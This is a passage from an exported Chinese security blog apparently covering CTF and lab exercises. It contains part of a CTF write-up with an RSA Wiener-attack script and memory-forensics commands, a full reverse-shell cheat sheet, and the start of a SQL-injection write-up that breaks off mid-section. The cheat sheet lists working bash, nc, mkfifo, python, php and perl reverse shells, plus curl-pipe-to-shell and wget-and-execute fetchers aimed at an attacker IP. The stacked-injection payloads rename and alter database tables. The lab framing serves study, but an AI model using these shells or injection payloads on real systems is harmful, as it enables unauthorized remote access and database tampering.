class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>大数e</p>
<p>可以判断是wiener attack</p>
<p>上网直接down脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>转base64在转brainfk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h2><p>http流base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h2><p>LSB隐写</p>
<p>red green blue 0 0 0</p>
<p>保存得二维码 扫得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p>
<p>可以看到pass中有明显字符串cumt</p>
<p>然后拿flag包裹就行</p>
<h2 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h2><p>隐藏文字</p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>
<p>可以看到有flag.png，输出一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>
<p>可以看到一个图片扫一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>
<p>解不出来</p>
<p>查看系统窗口列表，看有没有和flag有关的程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>
<p>可以看到有一个程序dump一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>
<p>用foremost分离一下</p>
<p>可以看到有图片</p>
<p>有key值和vi 然后就是AES加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>
<h2 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p>
<p>7a改成74</p>
<p>分离出secret.png</p>
<p>发现是一张图片，但有两帧</p>
<p>脱到steg里面可以看到两个残缺的二维码</p>
<p>补全，就可以看到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell总结</title>
    <url>/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近遇到反弹shell，总结一下反弹shell，用来做笔记</p>
<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>反向Shell指Shell回弹或者叫反射，就是说受害者kali把自己的Shell挂载（或者叫attach更合适）到某个端口上，以此暴露到攻击者win可以连接的位置，攻击者win通过连接该端口最终拿到shell。</p>
<p><strong>以下实验都为</strong></p>
<p><strong>kali为被攻击者来模仿服务器</strong></p>
<p><strong>win为攻击者</strong></p>
<p>kali（服务端）：192.168.202.129</p>
<p>win（客户端）：169.254.158.23</p>
<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>bash产生了一个交互环境让本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>首先在win上监听8080端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-n: 不反向解析dns，即不通过ip解析域名 no dns</p>
<p>-v: 详细信息输出 verbose</p>
<p>-l:  监听 listen</p>
<p>-p: 指定端口 port</p>
</blockquote>
<p>然后再kali上运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>之后反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png" alt="image-20201002205548782"></p>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>具体各参数的意义</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png" alt="image-20201002205958997"></p>
<p><strong>linux文件描述符</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</span><br><span class="line">1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</span><br><span class="line">2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>>&amp;</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br><span class="line">当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&amp;和&gt;的区别</span></span><br><span class="line">root@kali:/var/www/html# ls  //查看无1.php</span><br><span class="line">flag.php  index.php</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;1  //将错误内容输入到1文件中</span><br><span class="line">root@kali:/var/www/html# cat 1</span><br><span class="line">cat: 1.php: 没有那个文件或目录</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //将错误内容按标准输出出来</span><br><span class="line">cat: 1.php: 没有那个文件或目录</span><br></pre></td></tr></table></figure>
<ol>
<li>bash -i 产生一个bash环境</li>
<li><code>/dev/tcp/ip/port</code>： <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出。</li>
<li><code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li>
</ol>
<h2 id="nc一句话反弹"><a href="#nc一句话反弹" class="headerlink" title="nc一句话反弹"></a>nc一句话反弹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-e: 指定nc连接成功后执行的程序</p>
</blockquote>
<p>无-e的情况下可以执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>
<h3 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a><strong>实验</strong>1</h3><p>首先在win（客户端）上监听7777端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>然后在kali（服务端）上一句话反弹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png" alt="image-20201002211246793"></p>
<h3 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h3><p>win上监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>kali上执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png" alt="image-20201003140303187"></p>
<p>反弹成功</p>
<h2 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h2><p>前提要利用bash一句话的情况下使用curl反弹shell</p>
<p>kali上index文件上含有bash一句话，就可以反弹shell。</p>
<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>kali（服务端）上检查是否有bash一句话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>在win（客户端）上监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>利用服务端curl反弹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png" alt="image-20201002225540094"></p>
<h2 id="wget反弹"><a href="#wget反弹" class="headerlink" title="wget反弹"></a>wget反弹</h2><p>其实是利用wget和php脚本一块执行达到反弹</p>
<h3 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h3><p>首先在win（应该在任何一台服务器上也行）上有shell.txt，写入以下php内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"localhost"</span>,<span class="number">12345</span>);<span class="comment">//localhost为自己的ip</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先在win（客户端）上监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>在kali（服务端）上利用wget下载shell.txt，然后执行php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png" alt="image-20201002232826494"></p>
<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><p>利用curl</p>
<p>但这次用的是py脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #更改localhost为自己的ip,端口任意</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure>
<p>当然也可以直接执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("169.254.158.23",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><br></pre></td></tr></table></figure>
<p>效果是一样的</p>
<h3 id="实验1-1"><a href="#实验1-1" class="headerlink" title="实验1"></a>实验1</h3><p>首先在kali（服务端）上写下py脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #更改localhost为自己的ip,端口任意</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure>
<p>win（客户端）监听</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p>kali（服务端）curl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png" alt="image-20201003131626423"></p>
<h3 id="实验2-1"><a href="#实验2-1" class="headerlink" title="实验2"></a>实验2</h3><p>在win（客户端）监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>在kali（服务端）输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png" alt="image-20201003133539912"></p>
<h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><p>和python一样利用curl</p>
<p>php脚本如下，和上面的shell.txt一样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的ip，端口任意</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也可以执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<h3 id="实验1-2"><a href="#实验1-2" class="headerlink" title="实验1"></a>实验1</h3><p>首先在kali（服务端）写下php脚本，存为shell.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的ip，端口任意</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在win（客户端）监听端口</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p>kali（服务端）curl反弹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png" alt="image-20201003132843970"></p>
<h3 id="实验2-2"><a href="#实验2-2" class="headerlink" title="实验2"></a>实验2</h3><p>win上监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>kali上执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png" alt="image-20201003133806050"></p>
<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><p>和上面几个反弹一样</p>
<p>这里只做一下演示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="实验-3"><a href="#实验-3" class="headerlink" title="实验"></a>实验</h3><p>在win上监听端口</p>
<p>在kali上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure>
<p>反弹成功</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上都是最基本的反弹shell</p>
<p>其实反弹shell还是很灵活的，具体什么样的场景下怎么用还需要自己判断</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反弹shell</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU刷题(Web)</title>
    <url>/2020/09/27/BUU%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="BUU-Web"><a href="#BUU-Web" class="headerlink" title="BUU(Web)"></a>BUU(Web)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实自己会做完题写一些wp，但奈何自己三天摸鱼两天休息，所以上传上来监督自己学习</p>
<p>顺便分一下类</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="强网杯-2019-随便注（堆叠注入）"><a href="#强网杯-2019-随便注（堆叠注入）" class="headerlink" title="[强网杯 2019]随便注（堆叠注入）"></a>[强网杯 2019]随便注（堆叠注入）</h2><blockquote>
<p>堆叠注入：</p>
<p>分号（；）来表示一条sql语句的结束。结束一个sql语句再继续构造下一条语句，可以一起执行。堆叠注入可以执行的是任意的语句。</p>
</blockquote>
<p>先来了解一下堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; #</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png" alt="image-20200823154827319"></p>
<p>可以看到过滤了大多数语句，但我们还有show，alert，rename，desc等</p>
<p>通过看表可以看见两个表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>
<p>words表</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png" alt="image-20200823155250757"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;在mysql中数字型需要&#96;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png" alt="image-20200823180812053"></p>
<p>此时，我们就找见了flag，但问题是怎么拿出flag呢？</p>
<p>下面操作是骚姿势：</p>
<p>主要思想是利用回显位置来倒退获取flag，回显肯定是id到words表里面找数据，然后回显，那么我们在查询语句不变的前提下，将flag回显出来？</p>
<ul>
<li>把words表改名，把数字表改为words；</li>
<li>往新words表里面插入一个id参数，这样回显就可以找到id，从而显示出flag</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure>
<p>所以flag还得改成data</p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png" alt="image-20200823191000126"></p>
<p><strong>复习一下mysql操作</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#表重命名</span><br><span class="line">rename table o_name to n_name;</span><br><span class="line">#新增字段</span><br><span class="line">alert table table_name add column_name [type];</span><br><span class="line">#修改字段名</span><br><span class="line">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF-2019-EasySQL（堆叠注入）"><a href="#SUCTF-2019-EasySQL（堆叠注入）" class="headerlink" title="[SUCTF 2019]EasySQL（堆叠注入）"></a>[SUCTF 2019]EasySQL（堆叠注入）</h2><p>过滤了很多东西，但依然可以堆叠注入</p>
<p>找到Flag表</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png" alt="image-20200823214702265"></p>
<p>之后就不会做了…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure>
<blockquote>
